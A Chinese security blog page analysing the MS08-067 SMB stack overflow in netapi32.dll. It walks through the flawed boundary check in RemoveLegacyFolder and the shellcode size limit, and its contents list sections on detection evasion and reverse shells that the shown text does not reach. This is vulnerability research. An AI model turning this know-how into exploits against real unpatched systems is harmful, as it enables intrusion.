@@ -1,0 +1,910 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>漏洞考古：MS08067深入分析 | flag0&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="flag0">
+    
+
+    
+    <meta name="description" content="经典SMB 栈溢出漏洞深入分析">
+<meta name="keywords" content="Nday">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞考古：MS08067深入分析">
+<meta property="og:url" content="http://flag0.com/2021/11/26/漏洞考古：MS08067深入分析/index.html">
+<meta property="og:site_name" content="flag0&#39;s Blog">
+<meta property="og:description" content="经典SMB 栈溢出漏洞深入分析">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028200323-729296.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028200228-839807.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028201839-22486.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211029095620-604173.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103111258-689700.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113543-705386.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113840-457200.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113918-244653.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103114115-741423.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103114844-589908.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103005833-448272.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103010113-844136.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103010716-458355.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103011616-717865.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103014756-240432.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103013238-149657.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103015043-891734.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103165152-186404.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103171304-801052.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103172155-793380.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103173822-184371.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174023-634396.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174543-967812.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174814-219446.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175137-259964.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175918-2187.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175620-132935.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103180226-649234.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103212154-368918.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103180455-766422.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103213342-873404.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103222013-989172.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103222539-102906.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103224222-201412.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103231014-843614.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103225653-764282.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103225437-473964.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103233351-835519.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103234345-498771.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103234645-971143.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103235206-811247.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103235614-258528.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104001137-114344.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104091513-906627.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104093336-25595.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104094010-379505.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104100114-95241.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111503-546025.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111542-871025.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111653-714820.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104113207-592590.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104114916-605414.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104115455-347635.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122359-81699.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122740-794329.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122940-598886.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104123700-709037.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211101224832-227597.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211101231541-873682.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102092337-236263.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102003440-863051.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102092500-909738.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102150006-826247.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151715-805679.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151617-14983.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102145903-434031.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151632-338512.png">
+<meta property="og:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151556-880376.png">
+<meta property="og:updated_time" content="2022-04-10T09:30:40.702Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞考古：MS08067深入分析">
+<meta name="twitter:description" content="经典SMB 栈溢出漏洞深入分析">
+<meta name="twitter:image" content="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028200323-729296.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="flag0&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="flag0&#39;s Blog">flag0&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2021/11/26/漏洞考古：MS08067深入分析/" title="漏洞考古：MS08067深入分析" itemprop="url">漏洞考古：MS08067深入分析</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="flag0" target="_blank" itemprop="author">flag0</a>
+		
+  <p class="article-time">
+    <time datetime="2021-11-26T12:54:04.000Z" itemprop="datePublished"> Published 2021-11-26</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一-漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">(一)漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">(二)漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现环境"><span class="toc-number">2.1.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#静态分析"><span class="toc-number">2.3.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NetpwPathCanonicalize"><span class="toc-number">2.3.1.</span> <span class="toc-text">NetpwPathCanonicalize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CanonicalizePathName"><span class="toc-number">2.3.2.</span> <span class="toc-text">CanonicalizePathName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RemoveLegacyFolder"><span class="toc-number">2.3.3.</span> <span class="toc-text">RemoveLegacyFolder</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#第一次移除经典路径"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">第一次移除经典路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#第二次移除经典路径"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">第二次移除经典路径</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态调试"><span class="toc-number">2.4.</span> <span class="toc-text">动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地溢出调试"><span class="toc-number">2.4.1.</span> <span class="toc-text">本地溢出调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#环境配置"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#动态分析溢出流程"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">动态分析溢出流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内存布局分析"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">内存布局分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#字符产生的原因"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">\字符产生的原因</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程溢出调试"><span class="toc-number">2.4.2.</span> <span class="toc-text">远程溢出调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#环境配置-1"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#动态分析溢出流程-1"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">动态分析溢出流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#字符产生的原因-1"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">\字符产生的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#突破DEP"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">突破DEP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内存布局分析-1"><span class="toc-number">2.4.2.5.</span> <span class="toc-text">内存布局分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">2.4.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三-思路拓展：流量侧绕过"><span class="toc-number">3.</span> <span class="toc-text">(三)思路拓展：流量侧绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路一：利用与漏洞产生原理变换绕过检测特征"><span class="toc-number">3.1.</span> <span class="toc-text">思路一：利用与漏洞产生原理变换绕过检测特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路二：流量请求测绕过"><span class="toc-number">3.2.</span> <span class="toc-text">思路二：流量请求测绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四-应用场景：针对内网目标"><span class="toc-number">4.</span> <span class="toc-text">(四)应用场景：针对内网目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#拓扑"><span class="toc-number">4.1.</span> <span class="toc-text">拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景描述"><span class="toc-number">4.2.</span> <span class="toc-text">场景描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程"><span class="toc-number">4.3.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路分析"><span class="toc-number">4.4.</span> <span class="toc-text">思路分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实施"><span class="toc-number">4.5.</span> <span class="toc-text">具体实施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smb服务转发"><span class="toc-number">4.5.1.</span> <span class="toc-text">smb服务转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正反向shell转发"><span class="toc-number">4.5.2.</span> <span class="toc-text">正反向shell转发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#single-payload-windows-shell-bind-tcp"><span class="toc-number">4.5.2.1.</span> <span class="toc-text">single: payload/windows/shell_bind_tcp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#single-payload-windows-shell-reverse-tcp"><span class="toc-number">4.5.2.2.</span> <span class="toc-text">single: payload/windows/shell_reverse_tcp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章-1"><span class="toc-number">4.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<p>经典SMB 栈溢出漏洞深入分析</p>
+<a id="more"></a>
+<p>[TOC]</p>
+<h2 id="一-漏洞介绍"><a href="#一-漏洞介绍" class="headerlink" title="(一)漏洞介绍"></a>(一)漏洞介绍</h2><p><strong>1. 漏洞简述</strong></p>
+<ul>
+<li>漏洞名称：MS08-067</li>
+<li>漏洞编号：CVE-2008-4250</li>
+<li>漏洞类型：栈溢出</li>
+<li>漏洞影响：远程代码执行</li>
+<li>CVSS评分：9.8</li>
+<li>利用难度：Medium</li>
+<li>利用方式：远程</li>
+</ul>
+<p><strong>2. 组件概述</strong></p>
+<p>SMB是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等。</p>
+<p>Server Message Block  Protocol，服务器信息块协议(SMB)，为网络计算机客户程序提供一种从服务程序读写文件并请求服务的方法。SMB协议可在互联网的TCP/IP协议或者互联网数据包交换和NetBEUI等协议之上使用。使用SMB协议，应用程序可访问远程服务器的文件以及打印机、信槽和命名管道等资源。因而，客户程序可以读、写以及更新远程计算机上的文件，它也可以跟接收SMB客户请求的任意服务程序通信。  </p>
+<p>SMBv2是SMB协议的第二版本，相较SMBv1做了诸多扩展，部分数据包结构发生了变化，但仍保留了SMBv1的部分基本特征。</p>
+<p><strong>3. 漏洞利用</strong></p>
+<p>MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的。而<code>NetpwPathCanonicalize</code>函数在远程访问其他主机时，会调用<code>CanonicalizePathName</code>函数，对远程访问的路径进行规范化（将路径字符串中的’/‘转换为’\’,同时去除相对路径”.\”和”..\”），而在<code>CanonicalizePathName</code>函数中调用的<code>RemoveLegacyFolder</code>发生了栈缓冲区溢出，可以造成RCE。</p>
+<p>利用该漏洞可以达到远程代码执行的效果，通过使用不同的shellcode，可以实现任意功能，但是shellcode空间大小有限制。</p>
+<p><strong>4. 漏洞影响</strong></p>
+<p>根据Metasploit 中的Exp确定实际可以被攻击的操作系统版本。</p>
+<p>Windows 2000、2003 SP0\SP1\SP2、XP SP0/SP1/SP2/SP3</p>
+<h2 id="二-漏洞分析"><a href="#二-漏洞分析" class="headerlink" title="(二)漏洞分析"></a>(二)漏洞分析</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>操作系统版本：</p>
+<ul>
+<li>Microsoft Windows 10 专业版 10.0.18363</li>
+<li>Kali Linux 5.10.0 2021.2</li>
+<li>Windows XP SP3 Chinese - Simplified (NX)</li>
+</ul>
+<p>软件版本：</p>
+<ul>
+<li>Metasploit Framework: 6.1.10-dev</li>
+<li>IDA Pro 7.5</li>
+<li>Ollydbg 1.0</li>
+<li>Microsoft Visual Studio Community 2019 版本 16.8.4</li>
+</ul>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>漏洞产生于<code>netapi32.dll</code>，问题发生在其导出函数<code>NetpwPathCanonicalize</code>所调用的子函数<code>CanonicalizePathName</code>中的<code>RemoveLegacyFolder</code>函数中，原因为其在向上遍历<code>\</code>字符时栈首地址空间的边界检查无效，从而导致遍历完成，进行目录字符拷贝时，可以经过构造产生栈溢出，覆盖到返回地址中。</p>
+<p><strong>移除经典路径：</strong></p>
+<ul>
+<li><code>.\</code>当前目录</li>
+<li><code>..\</code>上一层目录</li>
+</ul>
+<p><code>RemoveLegacyFolder</code>函数的作用就是将路径中的经典路径去除。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028200323-729296.png" alt="1635422602301"></p>
+<p><strong>函数实现思路：</strong></p>
+<p>移去经典路径<code>.\</code></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028200228-839807.png" alt="1635422546832"></p>
+<p>从路径开头向右遍历依次去除<code>.\</code>即可。</p>
+<p>移去经典路径<code>..\</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211028201839-22486.png" alt="1635423518681"></p>
+<p>对于经典目录<code>..\</code>。</p>
+<p>如果p1为当前的指针，p2和p1总是相差3个字符的位置，因为p2到p3中间的路径长度FOLDER2是不固定的，所以无法直接获取到p3的位置，对于获取到p3的位置，主要有以下两种思路。</p>
+<ul>
+<li>思路1：使用变量记录每一个<code>\</code>的位置，当定位到<code>..\</code>经典目录时，直接获取到p3的位置，进行复制。</li>
+<li>思路2：从p2左侧开始依次向前开始遍历，寻找首次出现的<code>\</code>的位置即p3，进行复制。</li>
+</ul>
+<p><code>RemoveLegacyFolder</code>就是采用思路2来移除经典路径<code>..\</code>的，向前搜索的过程存在风险，并且对其边界检查无效，从而导致了缓冲区溢出的产生。</p>
+<p><strong>参考资料</strong></p>
+<p>《0day安全：漏洞软件分析技术》</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>函数调用链 <code>NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder</code></p>
+<h4 id="NetpwPathCanonicalize"><a href="#NetpwPathCanonicalize" class="headerlink" title="NetpwPathCanonicalize"></a>NetpwPathCanonicalize</h4><p><strong>函数作用：</strong>NetpwPathCanonicalize用于格式化网络路径字符串。</p>
+<p>如果prefix串非空，将prefix串与path串用<code>\</code>相连，并复制输出到串<code>can_path</code>中，输出串的容量为maxbuf字节大小。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix + &apos;\&apos; + path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure>
+<p><strong>函数原型</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Int <span class="title">NetpwPathCanonicalize</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Uint16 path[ ],			<span class="comment">// [in]	path name</span></span></span></span><br><span class="line"><span class="function"><span class="params">    Uint8 can_path[ ],		<span class="comment">// [out]  canonicalized path</span></span></span></span><br><span class="line"><span class="function"><span class="params">    Uint32 maxbuf,			<span class="comment">// [in] 	max size of can_path</span></span></span></span><br><span class="line"><span class="function"><span class="params">    Uint16 prefix[ ],		<span class="comment">// [in] 	path prefix</span></span></span></span><br><span class="line"><span class="function"><span class="params">    Uint32* pathtype,		<span class="comment">// [int out] path type</span></span></span></span><br><span class="line"><span class="function"><span class="params">    Uint32 pathflags		<span class="comment">// [in]	path flags, 0 or 1</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>用ida Pro加载netapi32.dll，定位到<code>NetpwPathCanonicalize</code>函数中，定位到调用<code>CanonicalizePathName</code>函数的位置。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211029095620-604173.png" alt="1635472579870"></p>
+<h4 id="CanonicalizePathName"><a href="#CanonicalizePathName" class="headerlink" title="CanonicalizePathName"></a>CanonicalizePathName</h4><p><strong>函数执行流程：</strong>在<code>CanonicalizePathName</code>函数中，对传入的<code>prefix</code>参数进行长度判断其不超过0x208，判断<code>prefixSize + pathSize</code>的长度不超过0x207，检查通过后拼接<code>prefix</code>和<code>path</code>到<code>wchPathBuffer</code>路径缓冲区中，将路径缓冲区中的路径字符串中的<code>/</code>替换成<code>\</code>，检查Dos路径类型，将<code>wchPathBuffer</code>字符缓冲区传入<code>RemoveLegacyFolder</code>函数中用来移除经典路径。</p>
+<hr>
+<p>在函数开始的位置检查<code>pwchPrefix</code>指向的地址是否为空。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103111258-689700.png" alt="1635909178281"></p>
+<p>判断<code>pwchPrefix</code>索引为0的字符的值不为0，字符串的长度长度不大于0x208，符合判断条件后，将<code>pwchPrefix</code>前缀字符串拷贝到<code>wchStrBuffer</code>缓冲区中，判断<code>pwchCanPath</code>缓冲区的<code>pwchPrefixSize+1</code>下标的位置是否为<code>\</code>或<code>/</code>者，如果不是则在<code>wchPathBuffer</code>中拼接<code>\\</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113543-705386.png" alt="1635910542380"></p>
+<p>判断参数<code>pwszPath</code>的开头部分是否是<code>\</code>或者<code>/</code>符号，如果是的话，对其指针+1。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113840-457200.png" alt="1635910719853"></p>
+<p>获取pwchPath的长度，检查，<code>pwchPrefixSize &lt;=pwchPathSize + pwchPrefixSize &lt;= 0x207</code>是否比<code>Path</code>本身的长度小，是否大于0x207。</p>
+<p><strong>从这里可以看到，构造shellcode时，有长度限制，即不能超过0x207 * 2  =&gt; 1038个字节(这里使用的wcslen，unicode占用两个字节的数据，所以×2)</strong></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103113918-244653.png" alt="1635910756884"></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103114115-741423.png" alt="1635910874883"></p>
+<p>检查通过，将<code>pwchPath</code>拷贝到<code>wchPathBuffer</code>缓冲区中，接下来替换路径缓冲区中的<code>/</code>字符为<code>\</code>字符，检查DOS路径类型，将处理完后的缓冲区的地址，送入<code>RemoveLegacyFolder</code>中进行去除经典路径。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103114844-589908.png" alt="1635911323436"></p>
+<h4 id="RemoveLegacyFolder"><a href="#RemoveLegacyFolder" class="headerlink" title="RemoveLegacyFolder"></a>RemoveLegacyFolder</h4><p><strong>函数执行流程：</strong>RemoveLegacyFolder函数首先判断首字符是否是<code>\</code>然后向后遍历寻找<code>\..\</code>，寻找到后经过判断将经典路径中后一个<code>\</code>的位置后的路径字符串，拷贝到经典路径中第一个<code>\</code>的位置，然后向前遍历<code>\</code>定位到上级目录，接着向后遍历寻找<code>\..\</code>，接着进行第二次移除经典路径的操作。</p>
+<hr>
+<h5 id="第一次移除经典路径"><a href="#第一次移除经典路径" class="headerlink" title="第一次移除经典路径"></a>第一次移除经典路径</h5><p>跟进<code>RemoveLegacyFolder</code>函数中，函数开头判断传入的路径缓冲区索引为0的字符是否为<code>\</code>或者<code>/</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103005833-448272.png" alt="1635872312978"></p>
+<p>判断路径缓冲区索引为1的字符是否是<code>\</code>或者<code>/</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103010113-844136.png" alt="1635872471948"></p>
+<p>接着更新p1指针的值为字符缓冲区的首地址，向后遍历，判断p1指向的字符否为<code>.</code></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103010716-458355.png" alt="1635872835355"></p>
+<p>当p1指向的字符为<code>\</code>时，更新指针p3为p2的值，更新变量temp为p1的值，执行完成后跳回到循环中。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103011616-717865.png" alt="1635873376077"></p>
+<p>当p1指向的字符为<code>.</code>时，判断其是否为经典路径<code>\..\</code>，符合条件后，从p1+4的位置开始的路径(为经典路径后的位置)，拷贝到p3指向的位置(p3指向字符<code>\</code>)，此处操作的作用为移除经典路径<code>\..\</code>极其上级目录。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103014756-240432.png" alt="1635875274951"></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103013238-149657.png" alt="1635874358001"></p>
+<h5 id="第二次移除经典路径"><a href="#第二次移除经典路径" class="headerlink" title="第二次移除经典路径"></a>第二次移除经典路径</h5><p>接着向下执行。</p>
+<p>更新指针：更新temp变量为p3的值，更新指针p1为p3的值，更新eax为p3-2的值。</p>
+<p>向前遍历<code>\</code></p>
+<p><strong>边界检查：</strong>判断eax指向的地址是否等于字符缓冲区的起始地址。</p>
+<p>在第一次执行到时，eax就已经超过了缓冲区的头部，向上越界越界了，此处再进行jz相等条件的比较是无效的，应该将其中的<code>jz</code> 跳转改为<code>jbe</code> 小于等于。</p>
+<p><strong>无效的边界检查和使用不安全的wcscpy函数，是导致溢出的直接原因。</strong></p>
+<p>在向前获取到<code>\</code>的地址后，p3指针指向该地址。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103015043-891734.png" alt="1635875442254"></p>
+<p>向下执行，跳转到向后遍历寻找p1指向的<code>.</code>的部分，紧接着判断经典路径，进行拷贝操作。</p>
+<p>当p1指向<code>.</code>时跳出循环，判断路径是否是<code>/../</code>，判断p3指向的地址是否为空地址，判断无误后开始进行拷贝，由于此时p3指向的地址，已经远远超过缓冲区的地址，所以此时使用<code>wcscpy</code>函数进行拷贝会产生溢出，经过精心构造，覆盖返回地址，从而控制eip。</p>
+<p><strong>分析到这里可以发现，第二次移除经典路径，向上遍历到的<code>\</code>的位置至关重要。</strong></p>
+<p>接下来开始分析《0day安全》书里的poc和Metasploit的exp是如何产生<code>\</code>，如何构造攻击包从而覆盖返回地址，过掉系统保护，从而执行shellcode的。</p>
